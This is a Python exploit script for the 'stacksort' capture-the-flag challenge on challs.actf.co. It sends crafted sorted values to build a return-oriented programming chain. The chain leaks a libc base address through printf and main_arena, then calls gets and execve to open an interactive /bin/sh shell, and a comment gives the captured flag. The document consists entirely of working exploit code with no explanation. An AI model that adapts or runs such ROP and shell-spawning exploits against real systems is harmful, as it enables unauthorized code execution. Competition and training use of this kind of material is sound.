#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './stacksort'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('remote')
env.set_item('mode',    remote = 'SOCKET')
env.set_item('target',  remote  = {'host':'challs.actf.co', 'port':31500})
env.set_item('libc',    remote  = 'libc.so.6')
env.select('remote')

#==========

binf = ELF(bin_file)
addr_ret            = 0x40101a
addr_plt_printf     = binf.plt['printf']
addr_start          = binf.sep_function['_start']
addr_main           = binf.sep_function['main']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_stdin          = libc.symbols['_IO_2_1_stdin_']
ofs_libc_mainarena      = ofs_libc_stdin + 0x1e0

#==========

def attack(conn, **kwargs):
    # 1st
    conn.send(str(addr_ret).encode().ljust(0xf)*0xe1)
    conn.send(str(addr_plt_printf).encode().ljust(0xf))
    conn.send(str(addr_main).encode().ljust(0xf)*(0x100-(0xe1+1)))
    conn.recvuntil(b'255: ')

    addr_libc_mainarena = u(conn.recvuntil(b'0', drop=True)) - 0x4d0
    libc.address = addr_libc_mainarena - ofs_libc_mainarena
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_ret       = libc.address + 0x02a179
    addr_libc_gets      = libc.sep_function['gets']     # 0x080520/0x0805a0
    addr_libc_call_r13  = libc.address + 0x0c609c
    addr_libc_execve    = libc.sep_function['execve']   # 0x0eb080/0x0eb0f0

    # 2nd
    conn.send(str(addr_libc_ret).encode().ljust(0xf)*0x31)
    conn.send(str(addr_libc_gets).encode().ljust(0xf))
    conn.send(str(addr_libc_call_r13).encode().ljust(0xf))
    conn.send((b'-1'.ljust(0xf)*(0x100-(0x31+0x2)))[0:-0x14])
    conn.recvuntil(b'255: ')

    conn.sendline(b'/bin/sh')

    # 3rd
    conn.send(str(addr_libc_ret).encode().ljust(0xf)*0x40)
    conn.send(str(addr_libc_execve).encode().ljust(0xf)*(0x100-0x40))
    conn.recvuntil(b'255: ')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # actf{s0rt1ng_th3_st4ck_f0r_fun_4nd_prof1t}

if __name__=='__main__':
    main()

#==========
